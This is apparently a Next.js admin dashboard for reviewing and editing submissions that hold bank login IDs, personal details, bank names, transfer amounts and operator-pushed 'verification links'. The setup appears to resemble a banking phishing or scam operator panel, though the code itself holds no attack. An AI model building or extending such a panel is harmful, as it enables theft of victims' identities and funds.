"use client";

import { useEffect, useState } from "react";

interface Submission {
  id: number;
  loginId: string | null;
  fullName: string | null;
  address: string | null;
  email: string | null;
  mobile: string | null;
  dateOfBirth: string | null;
  amount: string | null;
  bankName: string | null;
  transferOption: string | null;
  verificationLink: string | null;
  status: string | null;
  sheetRowIndex: string | null;
  createdAt: string | null;
}

export default function AdminPage() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);
  const [editingId, setEditingId] = useState<number | null>(null);
  const [editData, setEditData] = useState<Partial<Submission>>({});
  const [verifyLink, setVerifyLink] = useState<{ [id: number]: string }>({});
  const [message, setMessage] = useState("");

  const fetchSubmissions = async () => {
    setLoading(true);
    const res = await fetch("/api/submissions");
    const json = await res.json();
    if (json.success) setSubmissions(json.data);
    setLoading(false);
  };

  useEffect(() => {
    (async () => {
      await fetchSubmissions();
    })();
  }, []);

  const startEdit = (sub: Submission) => {
    setEditingId(sub.id);
    setEditData({ ...sub });
  };

  const saveEdit = async () => {
    if (!editingId) return;
    const res = await fetch(`/api/submissions/${editingId}`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(editData),
    });
    const json = await res.json();
    if (json.success) {
      setMessage("✅ Record updated successfully!");
      setEditingId(null);
      fetchSubmissions();
    } else {
      setMessage("❌ Update failed.");
    }
    setTimeout(() => setMessage(""), 3000);
  };

  const activateVerification = async (id: number) => {
    const link = verifyLink[id];
    if (!link) {
      setMessage("⚠️ Please enter a verification link first.");
      setTimeout(() => setMessage(""), 3000);
      return;
    }
    const res = await fetch(`/api/submissions/${id}/verify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ verificationLink: link }),
    });
    const json = await res.json();
    if (json.success) {
      setMessage("✅ Verification link activated! Customer will see it now.");
      setVerifyLink((prev) => ({ ...prev, [id]: "" }));
      fetchSubmissions();
    } else {
      setMessage("❌ Failed to activate.");
    }
    setTimeout(() => setMessage(""), 4000);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center">
        <div className="text-white text-xl animate-pulse">Loading submissions...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold text-yellow-400">Admin Dashboard</h1>
            <p className="text-gray-400 mt-1">Manage all customer submissions</p>
          </div>
          <button
            onClick={fetchSubmissions}
            className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm font-medium transition-colors"
          >
            🔄 Refresh
          </button>
        </div>

        {message && (
          <div className="mb-6 p-4 bg-gray-800 border border-yellow-400 rounded-lg text-yellow-300 font-medium">
            {message}
          </div>
        )}

        {submissions.length === 0 ? (
          <div className="text-center py-20 text-gray-400">
            <div className="text-6xl mb-4">📋</div>
            <p className="text-xl">No submissions yet</p>
          </div>
        ) : (
          <div className="space-y-6">
            {submissions.map((sub) => (
              <div
                key={sub.id}
                className="bg-gray-800 rounded-2xl border border-gray-700 overflow-hidden"
              >
                {/* Header */}
                <div className="flex items-center justify-between px-6 py-4 bg-gray-750 border-b border-gray-700">
                  <div className="flex items-center gap-3">
                    <span className="bg-yellow-400 text-gray-900 font-bold px-3 py-1 rounded-full text-sm">
                      #{sub.id}
                    </span>
                    <span className="font-semibold text-lg">{sub.fullName || "—"}</span>
                    <span
                      className={`text-xs px-2 py-1 rounded-full font-medium ${
                        sub.status === "verified"
                          ? "bg-green-900 text-green-300"
                          : "bg-orange-900 text-orange-300"
                      }`}
                    >
                      {sub.status === "verified" ? "✓ Verified" : "⏳ Pending"}
                    </span>
                  </div>
                  <div className="text-gray-400 text-sm">
                    {sub.createdAt
                      ? new Date(sub.createdAt).toLocaleDateString()
                      : "—"}
                  </div>
                </div>

                {/* Details / Edit */}
                <div className="p-6">
                  {editingId === sub.id ? (
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                      {[
                        { label: "Login ID", key: "loginId" },
                        { label: "Full Name", key: "fullName" },
                        { label: "Address", key: "address" },
                        { label: "Email", key: "email" },
                        { label: "Mobile", key: "mobile" },
                        { label: "Date of Birth", key: "dateOfBirth" },
                        { label: "Amount", key: "amount" },
                        { label: "Bank Name", key: "bankName" },
                        { label: "Transfer Option", key: "transferOption" },
                      ].map(({ label, key }) => (
                        <div key={key}>
                          <label className="block text-xs text-gray-400 mb-1">
                            {label}
                          </label>
                          <input
                            value={(editData as Record<string, string | null>)[key] || ""}
                            onChange={(e) =>
                              setEditData((prev) => ({
                                ...prev,
                                [key]: e.target.value,
                              }))
                            }
                            className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-yellow-400"
                          />
                        </div>
                      ))}
                      <div className="md:col-span-2 lg:col-span-3 flex gap-3 mt-2">
                        <button
                          onClick={saveEdit}
                          className="bg-green-600 hover:bg-green-700 px-5 py-2 rounded-lg text-sm font-medium transition-colors"
                        >
                          💾 Save Changes
                        </button>
                        <button
                          onClick={() => setEditingId(null)}
                          className="bg-gray-600 hover:bg-gray-500 px-5 py-2 rounded-lg text-sm font-medium transition-colors"
                        >
                          Cancel
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                      {[
                        { label: "Login ID", value: sub.loginId },
                        { label: "Email", value: sub.email },
                        { label: "Mobile", value: sub.mobile },
                        { label: "Date of Birth", value: sub.dateOfBirth },
                        { label: "Amount", value: sub.amount },
                        { label: "Bank Name", value: sub.bankName },
                        { label: "Transfer Option", value: sub.transferOption },
                        { label: "Address", value: sub.address },
                      ].map(({ label, value }) => (
                        <div key={label}>
                          <p className="text-xs text-gray-400 mb-1">{label}</p>
                          <p className="text-sm text-white font-medium truncate">
                            {value || "—"}
                          </p>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* Verification Link Section */}
                  <div className="mt-6 pt-6 border-t border-gray-700">
                    <p className="text-sm text-gray-400 mb-3 font-medium">
                      🔗 Verification Link Control
                    </p>
                    {sub.status === "verified" && sub.verificationLink ? (
                      <div className="flex items-center gap-3 bg-green-900/30 border border-green-700 rounded-xl p-4">
                        <span className="text-green-400 text-sm">
                          ✅ Activated:
                        </span>
                        <a
                          href={sub.verificationLink}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-400 underline text-sm truncate"
                        >
                          {sub.verificationLink}
                        </a>
                      </div>
                    ) : (
                      <div className="flex flex-col sm:flex-row gap-3">
                        <input
                          type="url"
                          placeholder="Enter your website verification link (e.g. https://yoursite.com)"
                          value={verifyLink[sub.id] || ""}
                          onChange={(e) =>
                            setVerifyLink((prev) => ({
                              ...prev,
                              [sub.id]: e.target.value,
                            }))
                          }
                          className="flex-1 bg-gray-700 border border-gray-600 rounded-xl px-4 py-2 text-sm text-white focus:outline-none focus:border-yellow-400 placeholder-gray-500"
                        />
                        <button
                          onClick={() => activateVerification(sub.id)}
                          className="bg-yellow-500 hover:bg-yellow-400 text-gray-900 font-bold px-6 py-2 rounded-xl text-sm transition-colors whitespace-nowrap"
                        >
                          ✓ Activate Link
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Actions */}
                  {editingId !== sub.id && (
                    <div className="mt-4 flex gap-3">
                      <button
                        onClick={() => startEdit(sub)}
                        className="bg-blue-700 hover:bg-blue-600 px-4 py-2 rounded-lg text-sm font-medium transition-colors"
                      >
                        ✏️ Edit Record
                      </button>
                    </div>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
